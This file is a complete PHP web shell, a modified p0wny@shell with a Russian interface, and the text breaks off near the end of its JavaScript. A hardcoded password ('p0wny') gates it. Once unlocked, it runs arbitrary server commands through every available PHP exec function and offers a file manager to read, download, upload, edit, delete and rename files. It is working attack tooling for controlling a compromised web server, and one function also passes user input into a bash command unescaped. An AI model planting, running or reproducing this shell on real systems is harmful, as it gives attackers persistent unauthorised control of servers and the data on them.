<?php
session_start();

// Пароль для доступа (измените на свой)
define('SHELL_PASSWORD', 'p0wny');

// Проверка авторизации
if (!isset($_SESSION['authenticated']) || $_SESSION['authenticated'] !== true) {
    if (isset($_POST['password'])) {
        if ($_POST['password'] === SHELL_PASSWORD) {
            $_SESSION['authenticated'] = true;
            header('Location: ' . $_SERVER['PHP_SELF']);
            exit();
        } else {
            $error = 'Неверный пароль';
        }
    }
    // Показываем форму авторизации
    ?>
    <!DOCTYPE html>
    <html>
    <head>
    <meta charset="UTF-8">
    <title>Авторизация</title>
    <style>
    body {
        background: linear-gradient(135deg, #1a1a1a 0%, #2d2d2d 100%);
        color: #fff;
        font-family: monospace;
        display: flex;
        justify-content: center;
        align-items: center;
        height: 100vh;
        margin: 0;
    }
    .login-box {
        background: rgba(30, 30, 30, 0.95);
        padding: 40px;
        border-radius: 12px;
        box-shadow: 0 10px 30px rgba(0, 0, 0, 0.5);
        border: 1px solid #444;
        text-align: center;
        width: 350px;
    }
    .login-box h2 {
        color: #75DF0B;
        margin-bottom: 30px;
        font-size: 24px;
    }
    input[type="password"] {
        background: #1a1a1a;
        border: 1px solid #444;
        color: #fff;
        padding: 12px;
        width: 100%;
        border-radius: 6px;
        font-size: 16px;
        margin-bottom: 20px;
        outline: none;
        transition: border-color 0.3s;
        font-family: monospace;
    }
    input[type="password"]:focus {
        border-color: #75DF0B;
    }
    button {
        background: #75DF0B;
        border: none;
        color: #000;
        padding: 12px 30px;
        border-radius: 6px;
        cursor: pointer;
        font-weight: bold;
        font-size: 16px;
        width: 100%;
        transition: background 0.3s;
        font-family: monospace;
    }
    button:hover {
        background: #85ef1b;
    }
    .error {
        color: #FF4180;
        margin-bottom: 15px;
        font-size: 14px;
    }
    </style>
    </head>
    <body>
    <div class="login-box">
    <?php if (isset($error)): ?>
    <div class="error"><?php echo htmlspecialchars($error); ?></div>
    <?php endif; ?>
    <form method="post">
    <input type="password" name="password" placeholder="Введите пароль" autofocus required>
    <button type="submit">Войти</button>
    </form>
    </div>
    </body>
    </html>
    <?php
    exit();
}

// Обработка выхода
if (isset($_GET['logout'])) {
    session_destroy();
    header('Location: ' . $_SERVER['PHP_SELF']);
    exit();
}

// Основной код оболочки
$SHELL_CONFIG = array(
    'username' => 'p0wny',
    'hostname' => 'shell',
);

function expandPath($path) {
    if (preg_match("#^(~[a-zA-Z0-9_.-]*)(/.*)?$#", $path, $match)) {
        exec("echo $match[1]", $stdout);
        return $stdout[0] . $match[2];
    }
    return $path;
}

function allFunctionExist($list = array()) {
    foreach ($list as $entry) {
        if (!function_exists($entry)) {
            return false;
        }
    }
    return true;
}

function executeCommand($cmd) {
    $output = '';
    if (function_exists('exec')) {
        exec($cmd, $output);
        $output = implode("\n", $output);
    } else if (function_exists('shell_exec')) {
        $output = shell_exec($cmd);
    } else if (allFunctionExist(array('system', 'ob_start', 'ob_get_contents', 'ob_end_clean'))) {
        ob_start();
        system($cmd);
        $output = ob_get_contents();
        ob_end_clean();
    } else if (allFunctionExist(array('passthru', 'ob_start', 'ob_get_contents', 'ob_end_clean'))) {
        ob_start();
        passthru($cmd);
        $output = ob_get_contents();
        ob_end_clean();
    } else if (allFunctionExist(array('popen', 'feof', 'fread', 'pclose'))) {
        $handle = popen($cmd, 'r');
        while (!feof($handle)) {
            $output .= fread($handle, 4096);
        }
        pclose($handle);
    } else if (allFunctionExist(array('proc_open', 'stream_get_contents', 'proc_close'))) {
        $handle = proc_open($cmd, array(0 => array('pipe', 'r'), 1 => array('pipe', 'w')), $pipes);
        $output = stream_get_contents($pipes[1]);
        proc_close($handle);
    }
    return $output;
}

function isRunningWindows() {
    return stripos(PHP_OS, "WIN") === 0;
}

function featureShell($cmd, $cwd) {
    $stdout = "";

    if (preg_match("/^\s*cd\s*(2>&1)?$/", $cmd)) {
        chdir(expandPath("~"));
    } elseif (preg_match("/^\s*cd\s+(.+)\s*(2>&1)?$/", $cmd)) {
        chdir($cwd);
        preg_match("/^\s*cd\s+([^\s]+)\s*(2>&1)?$/", $cmd, $match);
        chdir(expandPath($match[1]));
    } elseif (preg_match("/^\s*download\s+[^\s]+\s*(2>&1)?$/", $cmd)) {
        chdir($cwd);
        preg_match("/^\s*download\s+([^\s]+)\s*(2>&1)?$/", $cmd, $match);
        return featureDownload($match[1]);
    } else {
        chdir($cwd);
        $stdout = executeCommand($cmd);
    }

    return array(
        "stdout" => base64_encode($stdout),
                 "cwd" => base64_encode(getcwd())
    );
}

function featurePwd() {
    return array("cwd" => base64_encode(getcwd()));
}

function featureHint($fileName, $cwd, $type) {
    chdir($cwd);
    if ($type == 'cmd') {
        $cmd = "compgen -c $fileName";
    } else {
        $cmd = "compgen -f $fileName";
    }
    $cmd = "/bin/bash -c \"$cmd\"";
    $files = explode("\n", shell_exec($cmd));
    foreach ($files as &$filename) {
        $filename = base64_encode($filename);
    }
    return array(
        'files' => $files,
    );
}

function featureDownload($filePath) {
    $file = @file_get_contents($filePath);
    if ($file === FALSE) {
        return array(
            'stdout' => base64_encode('File not found / no read permission.'),
                     'cwd' => base64_encode(getcwd())
        );
    } else {
        return array(
            'name' => base64_encode(basename($filePath)),
                     'file' => base64_encode($file)
        );
    }
}

function featureUpload($path, $file, $cwd) {
    chdir($cwd);
    $f = @fopen($path, 'wb');
    if ($f === FALSE) {
        return array(
            'stdout' => base64_encode('Invalid path / no write permission.'),
                     'cwd' => base64_encode(getcwd())
        );
    } else {
        fwrite($f, base64_decode($file));
        fclose($f);
        return array(
            'stdout' => base64_encode('Done.'),
                     'cwd' => base64_encode(getcwd())
        );
    }
}

// Функции для файлового менеджера
function featureFileList($path) {
    $cwd = getcwd();
    if ($path && $path !== '.' && $path !== '..') {
        if (!chdir($path)) {
            return array('error' => 'Cannot access directory');
        }
    }

    $files = array();
    $list = scandir(getcwd());
    foreach ($list as $item) {
        if ($item == '.' || $item == '..') continue;

        $fullPath = getcwd() . '/' . $item;
        $files[] = array(
            'name' => $item,
            'type' => is_dir($fullPath) ? 'dir' : 'file',
                         'size' => is_file($fullPath) ? filesize($fullPath) : 0,
                         'perms' => substr(sprintf('%o', fileperms($fullPath)), -4),
                         'mtime' => filemtime($fullPath)
        );
    }

    chdir($cwd);
    return array(
        'files' => $files,
        'cwd' => getcwd()
    );
}

function featureFileDelete($path) {
    if (is_dir($path)) {
        $success = rmdir($path);
    } else {
        $success = unlink($path);
    }
    return array('success' => $success);
}

function featureFileRename($old, $new) {
    return array('success' => rename($old, $new));
}

function featureFileCreate($path) {
    $success = touch($path);
    return array('success' => $success);
}

function featureDirCreate($path) {
    $success = mkdir($path, 0755);
    return array('success' => $success);
}

function featureFileEdit($path, $content) {
    $success = file_put_contents($path, base64_decode($content));
    return array('success' => $success !== false);
}

function featureFileRead($path) {
    $content = file_get_contents($path);
    if ($content === false) {
        return array('error' => 'Cannot read file');
    }
    return array('content' => base64_encode($content));
}

function initShellConfig() {
    global $SHELL_CONFIG;

    if (isRunningWindows()) {
        $username = getenv('USERNAME');
        if ($username !== false) {
            $SHELL_CONFIG['username'] = $username;
        }
    } else {
        $pwuid = posix_getpwuid(posix_geteuid());
        if ($pwuid !== false) {
            $SHELL_CONFIG['username'] = $pwuid['name'];
        }
    }

    $hostname = gethostname();
    if ($hostname !== false) {
        $SHELL_CONFIG['hostname'] = $hostname;
    }
}

if (isset($_GET["feature"])) {
    header('Content-Type: application/json; charset=utf-8');
    $response = NULL;

    switch ($_GET["feature"]) {
        case "shell":
            $cmd = $_POST['cmd'];
            if (!preg_match('/2>/', $cmd)) {
                $cmd .= ' 2>&1';
            }
            $response = featureShell($cmd, $_POST["cwd"]);
            break;
        case "pwd":
            $response = featurePwd();
            break;
        case "hint":
            $response = featureHint($_POST['filename'], $_POST['cwd'], $_POST['type']);
            break;
        case 'upload':
            $response = featureUpload($_POST['path'], $_POST['file'], $_POST['cwd']);
            break;
        case 'filelist':
            $path = isset($_POST['path']) ? $_POST['path'] : '.';
            $response = featureFileList($path);
            break;
        case 'filedelete':
            $response = featureFileDelete($_POST['path']);
            break;
        case 'filerename':
            $response = featureFileRename($_POST['old'], $_POST['new']);
            break;
        case 'filecreate':
            $response = featureFileCreate($_POST['path']);
            break;
        case 'dircreate':
            $response = featureDirCreate($_POST['path']);
            break;
        case 'fileedit':
            $response = featureFileEdit($_POST['path'], $_POST['content']);
            break;
        case 'fileread':
            $response = featureFileRead($_POST['path']);
            break;
    }

    echo json_encode($response);
    die();
} else {
    initShellConfig();
}
?><!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8" />
<title>p0wny@shell:~#</title>
<meta name="viewport" content="width=device-width, initial-scale=1.0" />
<style>
* {
    box-sizing: border-box;
    margin: 0;
    padding: 0;
}

body {
    background: linear-gradient(135deg, #1a1a1a 0%, #2d2d2d 100%);
    color: #eee;
    font-family: monospace;
    min-height: 100vh;
    padding: 20px;
    display: flex;
    flex-direction: column;
    align-items: center;
}

.container {
    width: 100%;
    max-width: 1400px;
    background: rgba(30, 30, 30, 0.95);
    border-radius: 12px;
    box-shadow: 0 10px 30px rgba(0, 0, 0, 0.5);
    overflow: hidden;
    border: 1px solid #444;
    display: flex;
    flex-direction: column;
    height: 90vh;
}

.header {
    background: linear-gradient(to right, #222, #333);
    padding: 15px 25px;
    border-bottom: 2px solid #75DF0B;
    display: flex;
    justify-content: space-between;
    align-items: center;
}

.logo {
    font-size: 18px;
    font-weight: bold;
    color: #75DF0B;
}

.logout-btn {
    background: #FF4180;
    color: white;
    border: none;
    padding: 8px 16px;
    border-radius: 4px;
    cursor: pointer;
    font-size: 14px;
    transition: background 0.3s;
}

.logout-btn:hover {
    background: #e53970;
}

.tabs {
    display: flex;
    background: #252525;
    border-bottom: 1px solid #444;
}

.tab {
    padding: 15px 30px;
    cursor: pointer;
    background: transparent;
    border: none;
    color: #aaa;
    font-size: 16px;
    border-right: 1px solid #333;
    transition: all 0.3s;
}

.tab:hover {
    background: #333;
    color: #fff;
}

.tab.active {
    background: #1a1a1a;
    color: #75DF0B;
    border-bottom: 3px solid #75DF0B;
}

.tab-content {
    display: none;
    flex: 1;
    overflow: hidden;
}

.tab-content.active {
    display: flex;
    flex-direction: column;
}

/* Shell стили */
#shell {
background: #000;
color: #e0e0e0;
font-size: 13px;
line-height: 1.4;
flex: 1;
overflow: auto;
padding: 10px;
display: flex;
flex-direction: column;
}

#shell-content {
flex: 1;
overflow-y: auto;
white-space: pre-wrap;
word-break: break-all;
}

.shell-prompt {
    color: #75DF0B;
    font-weight: bold;
}

.shell-prompt span {
    color: #1BC9E7;
}

.shell-line {
    margin-bottom: 5px;
}

.shell-input-line {
    display: flex;
    align-items: flex-start;
}

.shell-input {
    background: transparent;
    border: none;
    color: #fff;
    font-size: 13px;
    outline: none;
    flex: 1;
    caret-color: #75DF0B;
    white-space: pre;
    overflow: hidden;
}

/* Файловый менеджер */
#filemanager {
flex: 1;
display: flex;
flex-direction: column;
overflow: hidden;
}

.fm-header {
    display: flex;
    gap: 10px;
    padding: 15px;
    background: #252525;
    align-items: center;
    border-bottom: 1px solid #444;
}

.fm-path {
    flex: 1;
    background: #1a1a1a;
    border: 1px solid #444;
    color: #fff;
    padding: 8px 12px;
    border-radius: 4px;
    font-size: 13px;
}

.fm-btn {
    background: #333;
    color: #fff;
    border: 1px solid #444;
    padding: 8px 16px;
    border-radius: 4px;
    cursor: pointer;
    font-size: 13px;
    transition: background 0.2s;
    white-space: nowrap;
}

.fm-btn:hover {
    background: #444;
}

.fm-btn.primary {
    background: #75DF0B;
    color: #000;
    border-color: #65cf00;
}

.fm-btn.primary:hover {
    background: #85ef1b;
}

.fm-btn.danger {
    background: #FF4180;
    color: white;
    border-color: #e53970;
}

.fm-btn.danger:hover {
    background: #ff5290;
}

#fm-content {
flex: 1;
overflow-y: auto;
background: #1a1a1a;
}

.fm-table {
    width: 100%;
    border-collapse: collapse;
}

.fm-table th {
    background: #252525;
    padding: 12px 15px;
    text-align: left;
    border-bottom: 2px solid #333;
    color: #75DF0B;
    font-weight: 600;
    position: sticky;
    top: 0;
    user-select: none;
}

.fm-table td {
    padding: 10px 15px;
    border-bottom: 1px solid #333;
    font-size: 13px;
    cursor: pointer;
    user-select: none;
}

.fm-table tr:hover {
    background: rgba(117, 223, 11, 0.1);
}

.fm-table tr.selected {
    background: rgba(117, 223, 11, 0.2);
}

.file-actions {
    display: flex;
    gap: 5px;
}

.action-btn {
    background: #333;
    border: none;
    color: #fff;
    padding: 4px 8px;
    border-radius: 3px;
    cursor: pointer;
    font-size: 11px;
    transition: background 0.2s;
    z-index: 2;
    position: relative;
}

.action-btn:hover {
    background: #444;
}

.action-btn.download {
    background: #1BC9E7;
    color: #000;
}

.action-btn.edit {
    background: #FFA726;
    color: #000;
}

.action-btn.delete {
    background: #FF4180;
    color: white;
}

/* Модальное окно */
.modal {
    display: none;
    position: fixed;
    top: 0;
    left: 0;
    width: 100%;
    height: 100%;
    background: rgba(0, 0, 0, 0.8);
    z-index: 1000;
    align-items: center;
    justify-content: center;
}

.modal-content {
    background: #252525;
    padding: 30px;
    border-radius: 8px;
    min-width: 500px;
    max-width: 90%;
    border: 1px solid #444;
    max-height: 80vh;
    overflow-y: auto;
}

.modal h3 {
    color: #75DF0B;
    margin-bottom: 20px;
    font-size: 18px;
}

.modal input,
.modal textarea {
    width: 100%;
    padding: 10px;
    margin-bottom: 15px;
    background: #1a1a1a;
    border: 1px solid #444;
    color: #fff;
    border-radius: 4px;
    resize: vertical;
}

.modal textarea {
    min-height: 400px;
    font-family: monospace;
    font-size: 13px;
}

.modal-buttons {
    display: flex;
    gap: 10px;
    justify-content: flex-end;
}

/* Полоса прокрутки */
::-webkit-scrollbar {
    width: 10px;
    height: 10px;
}

::-webkit-scrollbar-track {
    background: #1a1a1a;
    border-radius: 5px;
}

::-webkit-scrollbar-thumb {
    background: #444;
    border-radius: 5px;
}

::-webkit-scrollbar-thumb:hover {
    background: #555;
}

/* Утилиты */
.size-badge {
    background: #333;
    padding: 2px 6px;
    border-radius: 3px;
    font-size: 11px;
}

.perms-badge {
    background: #1a1a1a;
    padding: 2px 6px;
    border-radius: 3px;
    font-size: 11px;
}

/* Анимации */
@keyframes fadeIn {
    from { opacity: 0; transform: translateY(-10px); }
    to { opacity: 1; transform: translateY(0); }
}

.fade-in {
    animation: fadeIn 0.3s ease-out;
}

/* Блайнд */
.blink {
    animation: blink 1s infinite;
}

@keyframes blink {
    0%, 50% { opacity: 1; }
    51%, 100% { opacity: 0; }
}
</style>
</head>
<body>
<div class="container fade-in">
<div class="header">
<div class="logo">p0wny@shell:~#</div>
<button class="logout-btn" onclick="logout()">Выход</button>
</div>

<div class="tabs">
<button class="tab active" onclick="switchTab('shell')">Shell</button>
<button class="tab" onclick="switchTab('filemanager')">File Manager</button>
</div>

<!-- Вкладка Shell -->
<div id="shell-tab" class="tab-content active">
<div id="shell">
<div id="shell-content">
<!-- Консольный вывод здесь -->
</div>
</div>
</div>

<!-- Вкладка File Manager -->
<div id="filemanager-tab" class="tab-content">
<div id="filemanager">
<div class="fm-header">
<input type="text" id="fm-path" class="fm-path" value="/" readonly>
<button class="fm-btn" onclick="fmRefresh()">Обновить</button>
<button class="fm-btn" onclick="fmGoUp()">Наверх</button>
<button class="fm-btn primary" onclick="showModal('upload')">Загрузить</button>
<button class="fm-btn" onclick="showModal('createFile')">Файл</button>
<button class="fm-btn" onclick="showModal('createDir')">Папка</button>
</div>
<div id="fm-content">
<table class="fm-table">
<thead>
<tr>
<th width="40%">Имя</th>
<th width="15%">Размер</th>
<th width="15%">Права</th>
<th width="20%">Изменен</th>
<th width="10%">Действия</th>
</tr>
</thead>
<tbody id="fm-files">
<!-- Файлы будут загружены через JS -->
</tbody>
</table>
</div>
</div>
</div>
</div>

<!-- Модальные окна -->
<div id="uploadModal" class="modal">
<div class="modal-content">
<h3>Загрузка файла</h3>
<input type="file" id="fileToUpload">
<input type="text" id="uploadPath" placeholder="Путь (оставьте пустым для текущей папки)">
<div class="modal-buttons">
<button class="fm-btn" onclick="hideModal('upload')">Отмена</button>
<button class="fm-btn primary" onclick="uploadFile()">Загрузить</button>
</div>
</div>
</div>

<div id="createFileModal" class="modal">
<div class="modal-content">
<h3>Создать файл</h3>
<input type="text" id="newFileName" placeholder="Имя файла">
<div class="modal-buttons">
<button class="fm-btn" onclick="hideModal('createFile')">Отмена</button>
<button class="fm-btn primary" onclick="createFile()">Создать</button>
</div>
</div>
</div>

<div id="createDirModal" class="modal">
<div class="modal-content">
<h3>Создать папку</h3>
<input type="text" id="newDirName" placeholder="Имя папки">
<div class="modal-buttons">
<button class="fm-btn" onclick="hideModal('createDir')">Отмена</button>
<button class="fm-btn primary" onclick="createDir()">Создать</button>
</div>
</div>
</div>

<div id="renameModal" class="modal">
<div class="modal-content">
<h3>Переименовать</h3>
<input type="text" id="renameOld" placeholder="Старое имя" readonly>
<input type="text" id="renameNew" placeholder="Новое имя">
<div class="modal-buttons">
<button class="fm-btn" onclick="hideModal('rename')">Отмена</button>
<button class="fm-btn primary" onclick="renameFile()">Переименовать</button>
</div>
</div>
</div>

<div id="editFileModal" class="modal">
<div class="modal-content">
<h3>Редактировать файл</h3>
<input type="text" id="editFileName" readonly>
<textarea id="editFileContent" placeholder="Содержимое файла"></textarea>
<div class="modal-buttons">
<button class="fm-btn" onclick="hideModal('editFile')">Отмена</button>
<button class="fm-btn primary" onclick="saveFile()">Сохранить</button>
</div>
</div>
</div>

<script>
// Глобальные переменные
var SHELL_CONFIG = <?php echo json_encode($SHELL_CONFIG); ?>;
var CWD = null;
var FM_CWD = null;
var commandHistory = [];
var historyPosition = 0;
var eShellContent = null;
var currentModal = null;
var selectedFile = null;
var isShellActive = true;
var currentInput = null;

// Переключение вкладок
function switchTab(tabName) {
    document.querySelectorAll('.tab').forEach(tab => tab.classList.remove('active'));
    document.querySelectorAll('.tab-content').forEach(content => content.classList.remove('active'));

    document.querySelector(`.tab[onclick*="${tabName}"]`).classList.add('active');
    document.getElementById(`${tabName}-tab`).classList.add('active');

    isShellActive = tabName === 'shell';

    if (tabName === 'filemanager') {
        loadFileList();
    } else if (tabName === 'shell') {
        setTimeout(() => {
            focusShell();
        }, 100);
    }
}

// Выход
function logout() {
    if (confirm('Выйти из оболочки?')) {
        window.location.href = '?logout=1';
    }
}

// ==================== SHELL ЛОГИКА ====================

function focusShell() {
    if (isShellActive && currentInput) {
        currentInput.focus();
    }
}

function createPrompt() {
    var promptDiv = document.createElement('div');
    promptDiv.className = 'shell-input-line';

    var promptSpan = document.createElement('span');
    promptSpan.className = 'shell-prompt';
    promptSpan.innerHTML = genPrompt(CWD) + ' ';
    promptDiv.appendChild(promptSpan);

    var inputContainer = document.createElement('span');
    inputContainer.className = 'shell-input';
    inputContainer.contentEditable = true;
    inputContainer.spellcheck = false;

    promptDiv.appendChild(inputContainer);
    eShellContent.appendChild(promptDiv);

    // Скролл вниз
    eShellContent.scrollTop = eShellContent.scrollHeight;

    // Устанавливаем фокус
    currentInput = inputContainer;
    setTimeout(() => {
        inputContainer.focus();
        placeCaretAtEnd(inputContainer);
    }, 10);

    // Обработчики событий
    inputContainer.onkeydown = handleShellKeyDown;
}

function handleShellKeyDown(e) {
    var input = e.target;
    var text = input.innerText;

    switch (e.key) {
        case 'Enter':
            e.preventDefault();
            if (text.trim()) {
                executeShellCommand(text.trim());
            } else {
                // Пустая строка - просто новая строка с промптом
                appendToShell('<br>');
                createPrompt();
            }
            break;

        case 'ArrowUp':
            e.preventDefault();
            if (historyPosition > 0) {
                historyPosition--;
                input.innerText = commandHistory[historyPosition];
                placeCaretAtEnd(input);
            }
            break;

        case 'ArrowDown':
            e.preventDefault();
            if (historyPosition < commandHistory.length - 1) {
                historyPosition++;
                input.innerText = commandHistory[historyPosition];
            } else {
                historyPosition = commandHistory.length;
                input.innerText = '';
            }
            placeCaretAtEnd(input);
            break;

        case 'Tab':
            e.preventDefault();
            if (text.trim()) {
                featureHint(text.trim());
            }
            break;

        case 'c':
            if (e.ctrlKey) {
                e.preventDefault();
                appendToShell('^C<br>');
                createPrompt();
            }
            break;

        case 'l':
            if (e.ctrlKey) {
                e.preventDefault();
                eShellContent.innerHTML = '';
                createPrompt();
            }
            break;
    }
}

function placeCaretAtEnd(element) {
    element.focus();
    if (typeof window.getSelection != "undefined" && typeof document.createRange != "undefined") {
        var range = document.createRange();
        range.selectNodeContents(element);
        range.collapse(false);
        var sel = window.getSelection();
        sel.removeAllRanges();
        sel.addRange(range);
    }
}

function executeShellCommand(command) {
    // Добавляем команду в историю
    commandHistory.push(command);
    historyPosition = commandHistory.length;

    // Отображаем только промпт с командой (без дублирования)
    var currentLine = eShellContent.lastElementChild;
    if (currentLine && currentLine.querySelector('.shell-input')) {
        currentLine.remove();
    }

    // Добавляем команду с промптом
    appendToShell('<span class="shell-prompt">' + genPrompt(CWD) + '</span> ' + escapeHtml(command) + '<br>');

    if (command === 'clear') {
        eShellContent.innerHTML = '';
        createPrompt();
        return;
    }

    // Выполняем команду
    makeRequest("?feature=shell", {cmd: command, cwd: CWD}, function(response) {
        if (response.hasOwnProperty('file')) {
            // Скачивание файла
            featureDownload(atob(response.name), response.file);
            appendToShell('Download completed.<br>');
        } else {
            var output = atob(response.stdout);
            if (output) {
                appendToShell(output + '<br>');
            }
            updateCwd(atob(response.cwd));
        }
        createPrompt();
    });
}

function featureHint(command) {
    var currentCmd = command.split(" ");
    var type = (currentCmd.length === 1) ? "cmd" : "file";
    var fileName = (type === "cmd") ? currentCmd[0] : currentCmd[currentCmd.length - 1];

    makeRequest(
        "?feature=hint",
        {
            filename: fileName,
            cwd: CWD,
            type: type
        },
        function(data) {
            if (data.files && data.files.length > 0) {
                data.files = data.files.map(function(file){
                    return atob(file);
                }).filter(f => f);

                if (data.files.length > 0) {
                    appendToShell(data.files.join("  ") + '<br>');
                    createPrompt();
                }
            }
        }
    );
}

function featureDownload(name, file) {
    var element = document.createElement('a');
    element.setAttribute('href', 'data:application/octet-stream;base64,' + file);
    element.setAttribute('download', name);
    element.style.display = 'none';
    document.body.appendChild(element);
    element.click();
    document.body.removeChild(element);
}

function genPrompt(cwd) {
    cwd = cwd || "~";
    var shortCwd = cwd;
    if (cwd.split("/").length > 3) {
        var splittedCwd = cwd.split("/");
        shortCwd = "…/" + splittedCwd[splittedCwd.length-2] + "/" + splittedCwd[splittedCwd.length-1];
    }
    return SHELL_CONFIG["username"] + "@" + SHELL_CONFIG["hostname"] + ":<span>" + shortCwd + "</span>#";
}

function updateCwd(cwd) {
    if (cwd) {
        CWD = cwd;
    }
}

function appendToShell(html) {
    eShellContent.innerHTML += html;
    eShellContent.scrollTop = eShellContent.scrollHeight;
}

// ==================== FILE MANAGER ЛОГИКА ====================

function loadFileList() {
    var path = FM_CWD || '.';
    makeRequest("?feature=filelist", {path: path}, function(response) {
        if (response.error) {
            alert('Ошибка: ' + response.error);
            return;
        }

        if (response.cwd) {
            FM_CWD = response.cwd;
            document.getElementById('fm-path').value = FM_CWD;
        }

        var tbody = document.getElementById('fm-files');
        tbody.innerHTML = '';

    // Добавляем родительскую директорию
    if (FM_CWD && FM_CWD !== '/') {
        var row = document.createElement('tr');
        row.ondblclick = function() {
            FM_CWD = getParentDirectory(FM_CWD);
            loadFileList();
        };
        row.onclick = function() { selectRow(this); };
        row.innerHTML = `
        <td>..</td>
        <td><span class="size-badge">-</span></td>
        <td><span class="perms-badge">drwxr-xr-x</span></td>
        <td>-</td>
        <td>
        <div class="file-actions">
        <button class="action-btn" onclick="FM_CWD=getParentDirectory('${FM_CWD}');loadFileList();">Открыть</button>
        </div>
        </td>
        `;
        tbody.appendChild(row);
    }

    if (response.files && response.files.length > 0) {
        response.files.forEach(file => {
            var size = file.type === 'dir' ? '-' : formatSize(file.size);
            var date = new Date(file.mtime * 1000).toLocaleString();

            var row = document.createElement('tr');
            row.ondblclick = function() {
                if (file.type === 'dir') {
                    FM_CWD = (FM_CWD === '/' ? '' : FM_CWD) + '/' + file.name;
                    loadFileList();
                } else {
                    downloadFile(file.name);
                }
            };
            row.onclick = function(e) {
                if (!e.target.classList.contains('action-btn')) {
                    selectRow(this);
                    selectedFile = file.name;
                }
            };

            row.innerHTML = `
            <td>${file.name}${file.type === 'dir' ? '/' : ''}</td>
            <td><span class="size-badge">${size}</span></td>
            <td><span class="perms-badge">${file.perms}</span></td>
            <td>${date}</td>
            <td>
            <div class="file-actions">
            ${file.type === 'dir' ?
                `<button class="action-btn" onclick="FM_CWD=(FM_CWD==='/'?'':FM_CWD)+'/${file.name}';loadFileList();">Открыть</button>` :
                `<button class="action-btn download" onclick="downloadFile('${file.name}')">Скачать</button>
                <button class="action-btn edit" onclick="editFile('${file.name}')">Редакт.</button>`
            }
            <button class="action-btn delete" onclick="deleteFile('${file.name}')">Удалить</button>
            </div>
            </td>
            `;
            tbody.appendChild(row);
        });
    } else {
        var row = document.createElement('tr');
        row.innerHTML = '<td colspan="5" style="text-align:center;padding:20px;">Папка пуста</td>';
    tbody.appendChild(row);
    }
    });
}

function getParentDirectory(path) {
    if (!path || path === '/' || path === '.') return '/';
    var parts = path.split('/').filter(p => p);
    if (parts.length === 0) return '/';
    parts.pop();
    return parts.length === 0 ? '/' : '/' + parts.join('/');
}

function selectRow(row) {
    document.querySelectorAll('.fm-table tr').forEach(r => r.classList.remove('selected'));
    row.classList.add('selected');
}

function fmGoUp() {
    if (FM_CWD && FM_CWD !== '/') {
        FM_CWD = getParentDirectory(FM_CWD);
        loadFileList();
    }
}

function fmRefresh() {
    loadFileList();
}

function downloadFile(filename) {
    var path = (FM_CWD === '/' ? '' : FM_CWD) + '/' + filename;
    var element = document.createElement('a');
    element.setAttribute('href', '?feature=download&file=' + encodeURIComponent(path));
    element.setAttribute('download', filename);
    element.style.display = 'none';
    document.body.appendChild(element);
    element.click();
    document.body.removeChild(element);
}

function editFile(filename) {
    var path = (FM_CWD === '/' ? '' : FM_CWD) + '/' + filename;

    makeRequest("?feature=fileread", {path: path}, function(response) {
        if (response.error) {
            alert('Ошибка: ' + response.error);
            return;
        }

        document.getElementById('editFileName').value = filename;
        try {
            document.getElementById('editFileContent').value = decodeURIComponent(escape(atob(response.content)));
        } catch(e) {
            document.getElementById('editFileContent').value = atob(response.content);
        }
        showModal('editFile');
    });
}

function saveFile() {
    var filename = document.getElementById('editFileName').value;
    var content = document.getElementById('editFileContent').value;
    var path = (FM_CWD === '/' ? '' : FM_CWD) + '/' + filename;

    makeRequest("?feature=fileedit", {
        path: path,
        content: btoa(unescape(encodeURIComponent(content)))
    }, function(response) {
        if (response.success) {
            hideModal('editFile');
            alert('Файл сохранен');
            loadFileList();
        } else {
            alert('Ошибка сохранения файла');
        }
    });
}

function deleteFile(filename) {
    if (!confirm('Удалить "' + filename + '"?')) return;

    var path = (FM_CWD === '/' ? '' : FM_CWD) + '/' + filename;

    makeRequest("?feature=filedelete", {path: path}, function(response) {
        if (response.success) {
            loadFileList();
        } else {
            alert('Ошибка удаления');
        }
    });
}

function showRenameModal(filename) {
    document.getElementById('renameOld').value = filename;
    document.getElementById('renameNew').value = '';
    showModal('rename');
}

function renameFile() {
    var oldName = document.getElementById('renameOld').value;
    var newName = document.getElementById('renameNew').value;

    if (!newName) {
        alert('Введите новое имя');
        return;
    }

    var oldPath = (FM_CWD === '/' ? '' : FM_CWD) + '/' + oldName;
    var newPath = (FM_CWD === '/' ? '' : FM_CWD) + '/' + newName;

    makeRequest("?feature=filerename", {old: oldPath, new: newPath}, function(response) {
        if (response.success) {
            hideModal('rename');
            loadFileList();
        } else {
            alert('Ошибка переименования');
        }
    });
}

function createFile() {
    var name = document.getElementById('newFileName').value;
    if (!name) {
        alert('Введите имя файла');
        return;
    }

    var path = (FM_CWD === '/' ? '' : FM_CWD) + '/' + name;

    makeRequest("?feature=filecreate", {path: path}, function(response) {
        if (response.success) {
            hideModal('createFile');
            loadFileList();
        } else {
            alert('Ошибка создания файла');
        }
    });
}

function createDir() {
    var name = document.getElementById('newDirName').value;
    if (!name) {
        alert('Введите имя папки');
        return;
    }

    var path = (FM_CWD === '/' ? '' : FM_CWD) + '/' + name;

    makeRequest("?feature=dircreate", {path: path}, function(response) {
        if (response.success) {
            hideModal('createDir');
            loadFileList();
        } else {
            alert('Ошибка создания папки');
        }
    });
}

function uploadFile() {
    var fileInput = document.getElementById('fileToUpload');
    var pathInput = document.getElementById('uploadPath').value;

    if (!fileInput.files[0]) {
        alert('Выберите файл для загрузки');
        return;
    }

    var reader = new FileReader();
    reader.onload = function(e) {
        var base64 = e.target.result.split(',')[1];
        var filename = fileInput.files[0].name;
        var uploadPath = pathInput || ((FM_CWD === '/' ? '' : FM_CWD) + '/' + filename);

        makeRequest("?feature=upload", {
            path: uploadPath,
            file: base64,
            cwd: FM_CWD
        }, function(response) {
            if (response.stdout) {
                hideModal('upload');
                loadFileList();
                alert('Файл загружен');
            } else {
                alert('Ошибка загрузки');
            }
        });
    };
    reader.readAsDataURL(fileInput.files[0]);
}

// ==================== УТИЛИТЫ ====================

function showModal(type) {
    currentModal = type + 'Modal';
    document.getElementById(currentModal).style.display = 'flex';
}

function hideModal(type) {
    document.getElementById(type + 'Modal').style.display = 'none';
    currentModal = null;

    // Очищаем поля
    if (type === 'upload') {
        document.getElementById('fileToUpload').value = '';
        document.getElementById('uploadPath').value = '';
    } else if (type === 'createFile') {
        document.getElementById('newFileName').value = '';
    } else if (type === 'createDir') {
        document.getElementById('newDirName').value = '';
    }
}

function formatSize(bytes) {
    if (bytes === 0) return '0 B';
    var k = 1024;
    var sizes = ['B', 'KB', 'MB', 'GB'];
    var i = Math.floor(Math.log(bytes) / Math.log(k));
